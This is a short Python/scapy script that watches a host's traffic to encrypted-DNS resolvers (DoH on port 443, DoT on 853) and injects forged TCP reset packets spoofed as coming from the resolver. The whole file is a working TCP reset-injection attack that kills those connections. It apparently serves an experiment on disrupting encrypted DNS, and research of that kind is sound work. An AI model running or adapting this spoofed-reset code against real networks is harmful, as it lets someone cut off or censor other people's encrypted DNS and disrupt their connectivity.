import asyncio
from scapy.all import *
import argparse
from logger_DoE import *

logger = InfoLogger(interval=1)
logger.log_info(LogLevel.INFO, "程序开始运行")

async def process_packet(packet):
    if TCP in packet:
        seq = packet[TCP].seq
        ack = packet[TCP].ack
        local_port = packet[TCP].sport
        print(f"Seq: {seq}, Ack: {ack}")

        # Construct a new packet to send
        rst_packet = Ether(dst="00:16:3e:08:8b:25", src="ee:ff:ff:ff:ff:ff") / IP(dst=local_ip, src=target_ip) / TCP(sport=target_port,
                                                                                            dport=local_port, flags="AR",
                                                                                            seq=ack, ack=seq+1, window=0)
        sendp(rst_packet, iface='eth0')
        logger.log_info(LogLevel.PAYLOAD, rst_packet)


def sniff_packets():
    # Define a callback for processing packets
    def callback(packet):
        asyncio.run(process_packet(packet))

    # Start sniffing
    sniff(prn=callback, filter=f"tcp and ip src {local_ip} and ip dst {target_ip} and tcp dst port {target_port}", store=0,iface='eth0')


def main():
    sniff_packets()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--protocol', default='doh')
    parser.add_argument('-ip', '--ip', default='94.140.14.14')
    args = parser.parse_args()

    # target_ip = "94.140.14.14"
    # target_port = 443
    ports = {'doh':443, 'dot':853}
    target_ip = args.ip
    target_port = ports[args.protocol]
    local_ip = "172.22.115.154"
    main()
